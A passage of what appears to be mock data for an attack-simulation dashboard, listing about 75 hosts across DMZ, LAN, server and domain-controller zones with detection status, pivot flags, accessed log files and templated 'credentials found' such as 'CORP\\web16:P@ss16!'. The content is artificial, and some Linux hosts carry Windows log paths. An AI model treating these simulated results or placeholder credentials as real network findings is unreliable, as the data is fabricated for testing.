    node_agents:['sentinel_one'],
    },
    { node_id:'s5100EP-ep16', node_type:'ASSET', node_label:'WEB-16', node_hostname:'WEB-16',
      node_ip:'172.16.0.25', node_platform:'CentOS 7', node_status:'undetected',
      node_zone:'External DMZ', node_subnet:'172.16.0.0/24',
      node_accessed_files:['C:\\Logs\\WEB-16-audit.log'],
      node_credentials_found:['CORP\\web16:P@ss16!'],
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s5100EP-ep17', node_type:'ASSET', node_label:'APP-17', node_hostname:'APP-17',
      node_ip:'172.16.0.26', node_platform:'Windows Server 2019', node_status:'undetected',
      node_zone:'External DMZ', node_subnet:'172.16.0.0/24',
      node_accessed_files:['C:\\Logs\\APP-17-audit.log'],
      node_credentials_found:['CORP\\app17:P@ss17!'],
    node_agents:['palo_alto'],
    },
    { node_id:'s5100EP-ep18', node_type:'ASSET', node_label:'DB-18', node_hostname:'DB-18',
      node_ip:'172.16.0.27', node_platform:'CentOS 7', node_status:'prevented',
      node_zone:'External DMZ', node_subnet:'172.16.0.0/24',
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s5100EP-ep19', node_type:'ASSET', node_label:'FILE-19', node_hostname:'FILE-19',
      node_ip:'172.16.0.28', node_platform:'Ubuntu 20.04 LTS', node_status:'undetected',
      node_zone:'External DMZ', node_subnet:'172.16.0.0/24',
      node_accessed_files:['C:\\Logs\\FILE-19-audit.log'],
      node_credentials_found:['CORP\\file19:P@ss19!'],
    node_agents:['palo_alto'],
    },
    { node_id:'s5100EP-ep20', node_type:'ASSET', node_label:'MAIL-20', node_hostname:'MAIL-20',
      node_ip:'172.16.0.29', node_platform:'Ubuntu 22.04 LTS', node_status:'undetected',
      node_zone:'External DMZ', node_subnet:'172.16.0.0/24',
    node_agents:['palo_alto'],
    },
    { node_id:'s5100EP-ep21', node_type:'ASSET', node_label:'JUMP-21', node_hostname:'JUMP-21',
      node_ip:'10.10.1.70', node_platform:'Windows Server 2019', node_status:'undetected',
      node_zone:'Corp LAN', node_subnet:'10.10.1.0/24',
      node_accessed_files:['C:\\Logs\\JUMP-21-audit.log'],
      node_credentials_found:['CORP\\jump21:P@ss21!'],
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s5100EP-ep22', node_type:'ASSET', node_label:'PRINT-22', node_hostname:'PRINT-22',
      node_ip:'10.10.1.71', node_platform:'Windows Server 2019', node_status:'detected',
      node_zone:'Corp LAN', node_subnet:'10.10.1.0/24',
      node_accessed_files:['C:\\Logs\\PRINT-22-audit.log'],
      node_credentials_found:['CORP\\print22:P@ss22!'],
    node_agents:['palo_alto'],
    },
    { node_id:'s5100EP-ep23', node_type:'ASSET', node_label:'DNS-23', node_hostname:'DNS-23',
      node_ip:'10.10.1.72', node_platform:'Red Hat 8', node_status:'undetected',
      node_zone:'Corp LAN', node_subnet:'10.10.1.0/24',
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s5100EP-ep24', node_type:'ASSET', node_label:'DC-24', node_hostname:'DC-24',
      node_ip:'10.10.1.73', node_platform:'Red Hat 8', node_status:'undetected',
      node_zone:'Corp LAN', node_subnet:'10.10.1.0/24',
      node_accessed_files:['C:\\Logs\\DC-24-audit.log'],
      node_credentials_found:['CORP\\dc24:P@ss24!'],
    node_agents:['palo_alto'],
    },
    { node_id:'s5100EP-ep25', node_type:'ASSET', node_label:'WS-25', node_hostname:'WS-25',
      node_ip:'10.10.1.74', node_platform:'CentOS 7', node_status:'undetected',
      node_zone:'Corp LAN', node_subnet:'10.10.1.0/24',
    node_agents:['palo_alto'],
    },
    { node_id:'s5100EP-ep26', node_type:'ASSET', node_label:'API-26', node_hostname:'API-26',
      node_ip:'10.10.1.75', node_platform:'Windows 10', node_status:'undetected',
      node_zone:'Corp LAN', node_subnet:'10.10.1.0/24',
      node_accessed_files:['C:\\Logs\\API-26-audit.log'],
      node_credentials_found:['CORP\\api26:P@ss26!'],
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s5100EP-ep27', node_type:'ASSET', node_label:'BACKUP-27', node_hostname:'BACKUP-27',
      node_ip:'10.10.1.76', node_platform:'Ubuntu 20.04 LTS', node_status:'detected',
      node_zone:'Corp LAN', node_subnet:'10.10.1.0/24',
      node_is_pivot:true,
      node_accessed_files:['C:\\Logs\\BACKUP-27-audit.log'],
      node_credentials_found:['CORP\\backup27:P@ss27!'],
    node_agents:['palo_alto', 'sentinel_one', 'openaev'],
    },
    { node_id:'s5100EP-ep28', node_type:'ASSET', node_label:'MONITOR-28', node_hostname:'MONITOR-28',
      node_ip:'10.10.1.77', node_platform:'Ubuntu 20.04 LTS', node_status:'undetected',
      node_zone:'Corp LAN', node_subnet:'10.10.1.0/24',
      node_is_pivot:true,
    node_agents:['palo_alto', 'openaev'],
    },
    { node_id:'s5100EP-ep29', node_type:'ASSET', node_label:'VPN-29', node_hostname:'VPN-29',
      node_ip:'10.10.1.78', node_platform:'CentOS 7', node_status:'undetected',
      node_zone:'Corp LAN', node_subnet:'10.10.1.0/24',
      node_is_pivot:true,
    node_agents:['palo_alto', 'sentinel_one', 'openaev'],
    },
    { node_id:'s5100EP-ep30', node_type:'ASSET', node_label:'SIEM-30', node_hostname:'SIEM-30',
      node_ip:'10.10.1.79', node_platform:'CentOS 7', node_status:'detected',
      node_zone:'Corp LAN', node_subnet:'10.10.1.0/24',
      node_is_pivot:true,
    node_agents:['palo_alto', 'sentinel_one'],
    },
    { node_id:'s5100EP-ep31', node_type:'ASSET', node_label:'WEB-31', node_hostname:'WEB-31',
      node_ip:'10.10.1.80', node_platform:'Windows 11', node_status:'prevented',
      node_zone:'Corp LAN', node_subnet:'10.10.1.0/24',
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s5100EP-ep32', node_type:'ASSET', node_label:'APP-32', node_hostname:'APP-32',
      node_ip:'10.10.1.81', node_platform:'Ubuntu 22.04 LTS', node_status:'undetected',
      node_zone:'Corp LAN', node_subnet:'10.10.1.0/24',
      node_is_pivot:true,
      node_accessed_files:['C:\\Logs\\APP-32-audit.log'],
      node_credentials_found:['CORP\\app32:P@ss32!'],
    node_agents:['palo_alto', 'sentinel_one'],
    },
    { node_id:'s5100EP-ep33', node_type:'ASSET', node_label:'DB-33', node_hostname:'DB-33',
      node_ip:'10.10.1.82', node_platform:'Ubuntu 20.04 LTS', node_status:'undetected',
      node_zone:'Corp LAN', node_subnet:'10.10.1.0/24',
      node_accessed_files:['C:\\Logs\\DB-33-audit.log'],
      node_credentials_found:['CORP\\db33:P@ss33!'],
    node_agents:['palo_alto'],
    },
    { node_id:'s5100EP-ep34', node_type:'ASSET', node_label:'FILE-34', node_hostname:'FILE-34',
      node_ip:'10.10.1.83', node_platform:'Windows 11', node_status:'undetected',
      node_zone:'Corp LAN', node_subnet:'10.10.1.0/24',
      node_is_pivot:true,
    node_agents:['palo_alto', 'sentinel_one', 'openaev'],
    },
    { node_id:'s5100EP-ep35', node_type:'ASSET', node_label:'MAIL-35', node_hostname:'MAIL-35',
      node_ip:'10.10.1.84', node_platform:'Windows Server 2019', node_status:'undetected',
      node_zone:'Corp LAN', node_subnet:'10.10.1.0/24',
      node_accessed_files:['C:\\Logs\\MAIL-35-audit.log'],
      node_credentials_found:['CORP\\mail35:P@ss35!'],
    node_agents:['palo_alto'],
    },
    { node_id:'s5100EP-ep36', node_type:'ASSET', node_label:'JUMP-36', node_hostname:'JUMP-36',
      node_ip:'10.10.1.85', node_platform:'Ubuntu 22.04 LTS', node_status:'undetected',
      node_zone:'Corp LAN', node_subnet:'10.10.1.0/24',
      node_accessed_files:['C:\\Logs\\JUMP-36-audit.log'],
      node_credentials_found:['CORP\\jump36:P@ss36!'],
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s5100EP-ep37', node_type:'ASSET', node_label:'PRINT-37', node_hostname:'PRINT-37',
      node_ip:'10.10.1.86', node_platform:'Ubuntu 20.04 LTS', node_status:'undetected',
      node_zone:'Corp LAN', node_subnet:'10.10.1.0/24',
      node_accessed_files:['C:\\Logs\\PRINT-37-audit.log'],
      node_credentials_found:['CORP\\print37:P@ss37!'],
    node_agents:['sentinel_one'],
    },
    { node_id:'s5100EP-ep38', node_type:'ASSET', node_label:'DNS-38', node_hostname:'DNS-38',
      node_ip:'10.10.1.87', node_platform:'Red Hat 8', node_status:'undetected',
      node_zone:'Corp LAN', node_subnet:'10.10.1.0/24',
      node_accessed_files:['C:\\Logs\\DNS-38-audit.log'],
      node_credentials_found:['CORP\\dns38:P@ss38!'],
    node_agents:['sentinel_one'],
    },
    { node_id:'s5100EP-ep39', node_type:'ASSET', node_label:'DC-39', node_hostname:'DC-39',
      node_ip:'10.10.1.88', node_platform:'Red Hat 8', node_status:'detected',
      node_zone:'Corp LAN', node_subnet:'10.10.1.0/24',
      node_accessed_files:['C:\\Logs\\DC-39-audit.log'],
      node_credentials_found:['CORP\\dc39:P@ss39!'],
    node_agents:['palo_alto'],
    },
    { node_id:'s5100EP-ep40', node_type:'ASSET', node_label:'WS-40', node_hostname:'WS-40',
      node_ip:'10.10.1.89', node_platform:'Ubuntu 22.04 LTS', node_status:'undetected',
      node_zone:'Corp LAN', node_subnet:'10.10.1.0/24',
      node_accessed_files:['C:\\Logs\\WS-40-audit.log'],
      node_credentials_found:['CORP\\ws40:P@ss40!'],
    node_agents:['palo_alto'],
    },
    { node_id:'s5100EP-ep41', node_type:'ASSET', node_label:'API-41', node_hostname:'API-41',
      node_ip:'10.10.2.50', node_platform:'CentOS 7', node_status:'undetected',
      node_zone:'Server Farm', node_subnet:'10.10.2.0/24',
      node_is_pivot:true,
      node_accessed_files:['C:\\Logs\\API-41-audit.log'],
      node_credentials_found:['CORP\\api41:P@ss41!'],
    node_agents:['palo_alto', 'sentinel_one'],
    },
    { node_id:'s5100EP-ep42', node_type:'ASSET', node_label:'BACKUP-42', node_hostname:'BACKUP-42',
      node_ip:'10.10.2.51', node_platform:'Windows 10', node_status:'undetected',
      node_zone:'Server Farm', node_subnet:'10.10.2.0/24',
      node_is_pivot:true,
      node_accessed_files:['C:\\Logs\\BACKUP-42-audit.log'],
      node_credentials_found:['CORP\\backup42:P@ss42!'],
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s5100EP-ep43', node_type:'ASSET', node_label:'MONITOR-43', node_hostname:'MONITOR-43',
      node_ip:'10.10.2.52', node_platform:'Windows 10', node_status:'detected',
      node_zone:'Server Farm', node_subnet:'10.10.2.0/24',
      node_accessed_files:['C:\\Logs\\MONITOR-43-audit.log'],
      node_credentials_found:['CORP\\monitor43:P@ss43!'],
    node_agents:['palo_alto', 'openaev'],
    },
    { node_id:'s5100EP-ep44', node_type:'ASSET', node_label:'VPN-44', node_hostname:'VPN-44',
      node_ip:'10.10.2.53', node_platform:'Ubuntu 20.04 LTS', node_status:'prevented',
      node_zone:'Server Farm', node_subnet:'10.10.2.0/24',
    node_agents:['palo_alto', 'openaev'],
    },
    { node_id:'s5100EP-ep45', node_type:'ASSET', node_label:'SIEM-45', node_hostname:'SIEM-45',
      node_ip:'10.10.2.54', node_platform:'Windows Server 2019', node_status:'detected',
      node_zone:'Server Farm', node_subnet:'10.10.2.0/24',
      node_is_pivot:true,
      node_accessed_files:['C:\\Logs\\SIEM-45-audit.log'],
      node_credentials_found:['CORP\\siem45:P@ss45!'],
    node_agents:['palo_alto', 'sentinel_one', 'openaev'],
    },
    { node_id:'s5100EP-ep46', node_type:'ASSET', node_label:'WEB-46', node_hostname:'WEB-46',
      node_ip:'10.10.2.55', node_platform:'Windows 11', node_status:'undetected',
      node_zone:'Server Farm', node_subnet:'10.10.2.0/24',
      node_accessed_files:['C:\\Logs\\WEB-46-audit.log'],
      node_credentials_found:['CORP\\web46:P@ss46!'],
    node_agents:['palo_alto', 'openaev'],
    },
    { node_id:'s5100EP-ep47', node_type:'ASSET', node_label:'APP-47', node_hostname:'APP-47',
      node_ip:'10.10.2.56', node_platform:'CentOS 7', node_status:'prevented',
      node_zone:'Server Farm', node_subnet:'10.10.2.0/24',
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s5100EP-ep48', node_type:'ASSET', node_label:'DB-48', node_hostname:'DB-48',
      node_ip:'10.10.2.57', node_platform:'CentOS 7', node_status:'undetected',
      node_zone:'Server Farm', node_subnet:'10.10.2.0/24',
      node_accessed_files:['C:\\Logs\\DB-48-audit.log'],
      node_credentials_found:['CORP\\db48:P@ss48!'],
    node_agents:['palo_alto', 'openaev'],
    },
    { node_id:'s5100EP-ep49', node_type:'ASSET', node_label:'FILE-49', node_hostname:'FILE-49',
      node_ip:'10.10.2.58', node_platform:'Ubuntu 22.04 LTS', node_status:'undetected',
      node_zone:'Server Farm', node_subnet:'10.10.2.0/24',
      node_is_pivot:true,
      node_accessed_files:['C:\\Logs\\FILE-49-audit.log'],
      node_credentials_found:['CORP\\file49:P@ss49!'],
    node_agents:['palo_alto', 'sentinel_one', 'openaev'],
    },
    { node_id:'s5100EP-ep50', node_type:'ASSET', node_label:'MAIL-50', node_hostname:'MAIL-50',
      node_ip:'10.10.2.59', node_platform:'Ubuntu 20.04 LTS', node_status:'undetected',
      node_zone:'Server Farm', node_subnet:'10.10.2.0/24',
      node_accessed_files:['C:\\Logs\\MAIL-50-audit.log'],
      node_credentials_found:['CORP\\mail50:P@ss50!'],
    node_agents:['palo_alto', 'sentinel_one'],
    },
    { node_id:'s5100EP-ep51', node_type:'ASSET', node_label:'JUMP-51', node_hostname:'JUMP-51',
      node_ip:'10.10.2.60', node_platform:'Red Hat 8', node_status:'detected',
      node_zone:'Server Farm', node_subnet:'10.10.2.0/24',
      node_accessed_files:['C:\\Logs\\JUMP-51-audit.log'],
      node_credentials_found:['CORP\\jump51:P@ss51!'],
    node_agents:['palo_alto', 'sentinel_one', 'openaev'],
    },
    { node_id:'s5100EP-ep52', node_type:'ASSET', node_label:'PRINT-52', node_hostname:'PRINT-52',
      node_ip:'10.10.2.61', node_platform:'Red Hat 8', node_status:'detected',
      node_zone:'Server Farm', node_subnet:'10.10.2.0/24',
      node_accessed_files:['C:\\Logs\\PRINT-52-audit.log'],
      node_credentials_found:['CORP\\print52:P@ss52!'],
    node_agents:['palo_alto', 'openaev'],
    },
    { node_id:'s5100EP-ep53', node_type:'ASSET', node_label:'DNS-53', node_hostname:'DNS-53',
      node_ip:'10.10.2.62', node_platform:'CentOS 7', node_status:'undetected',
      node_zone:'Server Farm', node_subnet:'10.10.2.0/24',
      node_accessed_files:['C:\\Logs\\DNS-53-audit.log'],
      node_credentials_found:['CORP\\dns53:P@ss53!'],
    node_agents:['palo_alto', 'sentinel_one', 'openaev'],
    },
    { node_id:'s5100EP-ep54', node_type:'ASSET', node_label:'DC-54', node_hostname:'DC-54',
      node_ip:'10.10.2.63', node_platform:'Windows Server 2019', node_status:'undetected',
      node_zone:'Server Farm', node_subnet:'10.10.2.0/24',
      node_accessed_files:['C:\\Logs\\DC-54-audit.log'],
      node_credentials_found:['CORP\\dc54:P@ss54!'],
    node_agents:['palo_alto', 'openaev'],
    },
    { node_id:'s5100EP-ep55', node_type:'ASSET', node_label:'WS-55', node_hostname:'WS-55',
      node_ip:'10.10.2.64', node_platform:'CentOS 7', node_status:'undetected',
      node_zone:'Server Farm', node_subnet:'10.10.2.0/24',
      node_accessed_files:['C:\\Logs\\WS-55-audit.log'],
      node_credentials_found:['CORP\\ws55:P@ss55!'],
    node_agents:['palo_alto', 'openaev'],
    },
    { node_id:'s5100EP-ep56', node_type:'ASSET', node_label:'API-56', node_hostname:'API-56',
      node_ip:'10.10.2.65', node_platform:'CentOS 7', node_status:'undetected',
      node_zone:'Server Farm', node_subnet:'10.10.2.0/24',
      node_is_pivot:true,
      node_accessed_files:['C:\\Logs\\API-56-audit.log'],
      node_credentials_found:['CORP\\api56:P@ss56!'],
    node_agents:['palo_alto', 'openaev'],
    },
    { node_id:'s5100EP-ep57', node_type:'ASSET', node_label:'BACKUP-57', node_hostname:'BACKUP-57',
      node_ip:'10.10.2.66', node_platform:'Windows 11', node_status:'undetected',
      node_zone:'Server Farm', node_subnet:'10.10.2.0/24',
      node_is_pivot:true,
      node_accessed_files:['C:\\Logs\\BACKUP-57-audit.log'],
      node_credentials_found:['CORP\\backup57:P@ss57!'],
    node_agents:['palo_alto', 'sentinel_one'],
    },
    { node_id:'s5100EP-ep58', node_type:'ASSET', node_label:'MONITOR-58', node_hostname:'MONITOR-58',
      node_ip:'10.10.2.67', node_platform:'Windows 11', node_status:'detected',
      node_zone:'Server Farm', node_subnet:'10.10.2.0/24',
      node_is_pivot:true,
      node_accessed_files:['C:\\Logs\\MONITOR-58-audit.log'],
      node_credentials_found:['CORP\\monitor58:P@ss58!'],
    node_agents:['palo_alto', 'sentinel_one', 'openaev'],
    },
    { node_id:'s5100EP-ep59', node_type:'ASSET', node_label:'VPN-59', node_hostname:'VPN-59',
      node_ip:'10.10.2.68', node_platform:'Windows Server 2019', node_status:'prevented',
      node_zone:'Server Farm', node_subnet:'10.10.2.0/24',
    node_agents:['palo_alto', 'sentinel_one', 'openaev'],
    },
    { node_id:'s5100EP-ep60', node_type:'ASSET', node_label:'SIEM-60', node_hostname:'SIEM-60',
      node_ip:'10.10.2.69', node_platform:'Ubuntu 20.04 LTS', node_status:'undetected',
      node_zone:'Server Farm', node_subnet:'10.10.2.0/24',
      node_is_pivot:true,
      node_accessed_files:['C:\\Logs\\SIEM-60-audit.log'],
      node_credentials_found:['CORP\\siem60:P@ss60!'],
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s5100EP-ep61', node_type:'ASSET', node_label:'WEB-61', node_hostname:'WEB-61',
      node_ip:'10.10.3.20', node_platform:'Ubuntu 22.04 LTS', node_status:'undetected',
      node_zone:'Restricted Net', node_subnet:'10.10.3.0/24',
      node_accessed_files:['C:\\Logs\\WEB-61-audit.log'],
      node_credentials_found:['CORP\\web61:P@ss61!'],
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s5100EP-ep62', node_type:'ASSET', node_label:'APP-62', node_hostname:'APP-62',
      node_ip:'10.10.3.21', node_platform:'CentOS 7', node_status:'prevented',
      node_zone:'Restricted Net', node_subnet:'10.10.3.0/24',
    node_agents:['palo_alto'],
    },
    { node_id:'s5100EP-ep63', node_type:'ASSET', node_label:'DB-63', node_hostname:'DB-63',
      node_ip:'10.10.3.22', node_platform:'Windows 11', node_status:'prevented',
      node_zone:'Restricted Net', node_subnet:'10.10.3.0/24',
    node_agents:['sentinel_one'],
    },
    { node_id:'s5100EP-ep64', node_type:'ASSET', node_label:'FILE-64', node_hostname:'FILE-64',
      node_ip:'10.10.3.23', node_platform:'Ubuntu 22.04 LTS', node_status:'undetected',
      node_zone:'Restricted Net', node_subnet:'10.10.3.0/24',
      node_accessed_files:['C:\\Logs\\FILE-64-audit.log'],
      node_credentials_found:['CORP\\file64:P@ss64!'],
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s5100EP-ep65', node_type:'ASSET', node_label:'MAIL-65', node_hostname:'MAIL-65',
      node_ip:'10.10.3.24', node_platform:'Windows Server 2019', node_status:'undetected',
      node_zone:'Restricted Net', node_subnet:'10.10.3.0/24',
      node_is_pivot:true,
      node_accessed_files:['C:\\Logs\\MAIL-65-audit.log'],
      node_credentials_found:['CORP\\mail65:P@ss65!'],
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s5100EP-ep66', node_type:'ASSET', node_label:'JUMP-66', node_hostname:'JUMP-66',
      node_ip:'10.10.3.25', node_platform:'Ubuntu 22.04 LTS', node_status:'detected',
      node_zone:'Restricted Net', node_subnet:'10.10.3.0/24',
      node_is_pivot:true,
      node_accessed_files:['C:\\Logs\\JUMP-66-audit.log'],
      node_credentials_found:['CORP\\jump66:P@ss66!'],
    node_agents:['palo_alto', 'openaev'],
    },
    { node_id:'s5100EP-ep67', node_type:'ASSET', node_label:'PRINT-67', node_hostname:'PRINT-67',
      node_ip:'10.10.3.26', node_platform:'Ubuntu 22.04 LTS', node_status:'prevented',
      node_zone:'Restricted Net', node_subnet:'10.10.3.0/24',
    node_agents:['openaev'],
    },
    { node_id:'s5100EP-ep68', node_type:'ASSET', node_label:'DNS-68', node_hostname:'DNS-68',
      node_ip:'10.10.3.27', node_platform:'Windows 11', node_status:'undetected',
      node_zone:'Restricted Net', node_subnet:'10.10.3.0/24',
      node_accessed_files:['C:\\Logs\\DNS-68-audit.log'],
      node_credentials_found:['CORP\\dns68:P@ss68!'],
    node_agents:['sentinel_one'],
    },
    { node_id:'s5100EP-ep69', node_type:'ASSET', node_label:'DC-69', node_hostname:'DC-69',
      node_ip:'10.10.3.28', node_platform:'Windows 10', node_status:'detected',
      node_zone:'Restricted Net', node_subnet:'10.10.3.0/24',
      node_is_pivot:true,
      node_accessed_files:['C:\\Logs\\DC-69-audit.log'],
      node_credentials_found:['CORP\\dc69:P@ss69!'],
    node_agents:['palo_alto', 'openaev'],
    },
    { node_id:'s5100EP-ep70', node_type:'ASSET', node_label:'WS-70', node_hostname:'WS-70',
      node_ip:'10.10.3.29', node_platform:'Ubuntu 20.04 LTS', node_status:'undetected',
      node_zone:'Restricted Net', node_subnet:'10.10.3.0/24',
      node_is_pivot:true,
      node_accessed_files:['C:\\Logs\\WS-70-audit.log'],
      node_credentials_found:['CORP\\ws70:P@ss70!'],
    node_agents:['palo_alto', 'openaev'],
    },
    { node_id:'s5100EP-ep71', node_type:'ASSET', node_label:'API-71', node_hostname:'API-71',
      node_ip:'10.10.3.30', node_platform:'Red Hat 8', node_status:'detected',
      node_zone:'Restricted Net', node_subnet:'10.10.3.0/24',
      node_accessed_files:['C:\\Logs\\API-71-audit.log'],
      node_credentials_found:['CORP\\api71:P@ss71!'],
    node_agents:['palo_alto'],
    },
    { node_id:'s5100EP-ep72', node_type:'ASSET', node_label:'BACKUP-72', node_hostname:'BACKUP-72',
      node_ip:'10.10.3.31', node_platform:'Red Hat 8', node_status:'undetected',
      node_zone:'Restricted Net', node_subnet:'10.10.3.0/24',
      node_is_pivot:true,
      node_accessed_files:['C:\\Logs\\BACKUP-72-audit.log'],
      node_credentials_found:['CORP\\backup72:P@ss72!'],
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s5100EP-ep73', node_type:'ASSET', node_label:'MONITOR-73', node_hostname:'MONITOR-73',
      node_ip:'10.10.3.32', node_platform:'Windows 11', node_status:'undetected',
      node_zone:'Restricted Net', node_subnet:'10.10.3.0/24',
      node_accessed_files:['C:\\Logs\\MONITOR-73-audit.log'],
      node_credentials_found:['CORP\\monitor73:P@ss73!'],
    node_agents:['palo_alto'],
    },
    { node_id:'s5100EP-ep74', node_type:'ASSET', node_label:'VPN-74', node_hostname:'VPN-74',
      node_ip:'10.10.3.33', node_platform:'Ubuntu 20.04 LTS', node_status:'prevented',
      node_zone:'Restricted Net', node_subnet:'10.10.3.0/24',
    node_agents:['palo_alto'],
    },
    { node_id:'s5100EP-ep75', node_type:'ASSET', node_label:'SIEM-75', node_hostname:'SIEM-75',
      node_ip:'10.10.3.34', node_platform:'Windows 11', node_status:'undetected',
      node_zone:'Restricted Net', node_subnet:'10.10.3.0/24',
      node_is_pivot:true,
      node_accessed_files:['C:\\Logs\\SIEM-75-audit.log'],
      node_credentials_found:['CORP\\siem75:P@ss75!'],
    node_agents:['palo_alto', 'openaev'],
    },
    { node_id:'s5100EP-ep76', node_type:'ASSET', node_label:'WEB-76', node_hostname:'WEB-76',
      node_ip:'10.10.3.35', node_platform:'Red Hat 8', node_status:'undetected',
      node_zone:'Restricted Net', node_subnet:'10.10.3.0/24',
      node_is_pivot:true,
      node_accessed_files:['C:\\Logs\\WEB-76-audit.log'],
      node_credentials_found:['CORP\\web76:P@ss76!'],
    node_agents:['palo_alto', 'sentinel_one', 'openaev'],
    },
    { node_id:'s5100EP-ep77', node_type:'ASSET', node_label:'APP-77', node_hostname:'APP-77',
      node_ip:'10.10.3.36', node_platform:'Windows 10', node_status:'undetected',
      node_zone:'Restricted Net', node_subnet:'10.10.3.0/24',
      node_is_pivot:true,
      node_accessed_files:['C:\\Logs\\APP-77-audit.log'],
      node_credentials_found:['CORP\\app77:P@ss77!'],
    node_agents:['palo_alto', 'sentinel_one', 'openaev'],
    },
    { node_id:'s5100EP-ep78', node_type:'ASSET', node_label:'DB-78', node_hostname:'DB-78',
      node_ip:'10.10.3.37', node_platform:'CentOS 7', node_status:'prevented',
      node_zone:'Restricted Net', node_subnet:'10.10.3.0/24',
    node_agents:['sentinel_one'],
    },
    { node_id:'s5100EP-ep79', node_type:'ASSET', node_label:'FILE-79', node_hostname:'FILE-79',
      node_ip:'10.10.3.38', node_platform:'Windows 11', node_status:'undetected',
      node_zone:'Restricted Net', node_subnet:'10.10.3.0/24',
      node_accessed_files:['C:\\Logs\\FILE-79-audit.log'],
      node_credentials_found:['CORP\\file79:P@ss79!'],
    node_agents:['palo_alto'],
    },
    { node_id:'s5100EP-ep80', node_type:'ASSET', node_label:'MAIL-80', node_hostname:'MAIL-80',
      node_ip:'10.10.3.39', node_platform:'Ubuntu 20.04 LTS', node_status:'prevented',
      node_zone:'Restricted Net', node_subnet:'10.10.3.0/24',
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s5100EP-ep81', node_type:'ASSET', node_label:'JUMP-81', node_hostname:'JUMP-81',
      node_ip:'10.10.4.10', node_platform:'Red Hat 8', node_status:'undetected',
      node_zone:'AD / DC Tier', node_subnet:'10.10.4.0/24',
      node_accessed_files:['C:\\Logs\\JUMP-81-audit.log'],
      node_credentials_found:['CORP\\jump81:P@ss81!'],
    node_agents:['openaev'],
    },
    { node_id:'s5100EP-ep82', node_type:'ASSET', node_label:'PRINT-82', node_hostname:'PRINT-82',
      node_ip:'10.10.4.11', node_platform:'Ubuntu 22.04 LTS', node_status:'detected',
      node_zone:'AD / DC Tier', node_subnet:'10.10.4.0/24',
      node_is_pivot:true,
      node_accessed_files:['C:\\Logs\\PRINT-82-audit.log'],
      node_credentials_found:['CORP\\print82:P@ss82!'],
    node_agents:['palo_alto', 'sentinel_one'],
    },
    { node_id:'s5100EP-ep83', node_type:'ASSET', node_label:'DNS-83', node_hostname:'DNS-83',
      node_ip:'10.10.4.12', node_platform:'Windows Server 2019', node_status:'undetected',
      node_zone:'AD / DC Tier', node_subnet:'10.10.4.0/24',
      node_accessed_files:['C:\\Logs\\DNS-83-audit.log'],
      node_credentials_found:['CORP\\dns83:P@ss83!'],
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s5100EP-ep84', node_type:'ASSET', node_label:'DC-84', node_hostname:'DC-84',
      node_ip:'10.10.4.13', node_platform:'Windows Server 2019', node_status:'detected',
      node_zone:'AD / DC Tier', node_subnet:'10.10.4.0/24',
      node_accessed_files:['C:\\Logs\\DC-84-audit.log'],
      node_credentials_found:['CORP\\dc84:P@ss84!'],
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s5100EP-ep85', node_type:'ASSET', node_label:'WS-85', node_hostname:'WS-85',
      node_ip:'10.10.4.14', node_platform:'Windows Server 2019', node_status:'undetected',
      node_zone:'AD / DC Tier', node_subnet:'10.10.4.0/24',
      node_accessed_files:['C:\\Logs\\WS-85-audit.log'],
      node_credentials_found:['CORP\\ws85:P@ss85!'],
    node_agents:['sentinel_one'],
    },
    { node_id:'s5100EP-ep86', node_type:'ASSET', node_label:'API-86', node_hostname:'API-86',
      node_ip:'10.10.4.15', node_platform:'Windows 10', node_status:'undetected',
      node_zone:'AD / DC Tier', node_subnet:'10.10.4.0/24',
      node_is_pivot:true,
      node_accessed_files:['C:\\Logs\\API-86-audit.log'],
      node_credentials_found:['CORP\\api86:P@ss86!'],
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s5100EP-ep87', node_type:'ASSET', node_label:'BACKUP-87', node_hostname:'BACKUP-87',
      node_ip:'10.10.4.16', node_platform:'Windows 10', node_status:'undetected',
      node_zone:'AD / DC Tier', node_subnet:'10.10.4.0/24',
      node_is_pivot:true,
      node_accessed_files:['C:\\Logs\\BACKUP-87-audit.log'],
      node_credentials_found:['CORP\\backup87:P@ss87!'],
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s5100EP-ep88', node_type:'ASSET', node_label:'MONITOR-88', node_hostname:'MONITOR-88',
      node_ip:'10.10.4.17', node_platform:'Windows 10', node_status:'undetected',
      node_zone:'AD / DC Tier', node_subnet:'10.10.4.0/24',
      node_accessed_files:['C:\\Logs\\MONITOR-88-audit.log'],
      node_credentials_found:['CORP\\monitor88:P@ss88!'],
    node_agents:['sentinel_one'],
    },
    { node_id:'s5100EP-ep89', node_type:'ASSET', node_label:'VPN-89', node_hostname:'VPN-89',
      node_ip:'10.10.4.18', node_platform:'Ubuntu 20.04 LTS', node_status:'undetected',
      node_zone:'AD / DC Tier', node_subnet:'10.10.4.0/24',
      node_accessed_files:['C:\\Logs\\VPN-89-audit.log'],
      node_credentials_found:['CORP\\vpn89:P@ss89!'],
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s5100EP-ep90', node_type:'ASSET', node_label:'SIEM-90', node_hostname:'SIEM-90',
      node_ip:'10.10.4.19', node_platform:'Windows 10', node_status:'prevented',
      node_zone:'AD / DC Tier', node_subnet:'10.10.4.0/24',
    node_agents:['openaev'],
    },
    { node_id:'s5100EP-ep91', node_type:'ASSET', node_label:'WEB-91', node_hostname:'WEB-91',
      node_ip:'10.10.4.20', node_platform:'Windows 10', node_status:'undetected',
      node_zone:'AD / DC Tier', node_subnet:'10.10.4.0/24',
      node_accessed_files:['C:\\Logs\\WEB-91-audit.log'],
      node_credentials_found:['CORP\\web91:P@ss91!'],
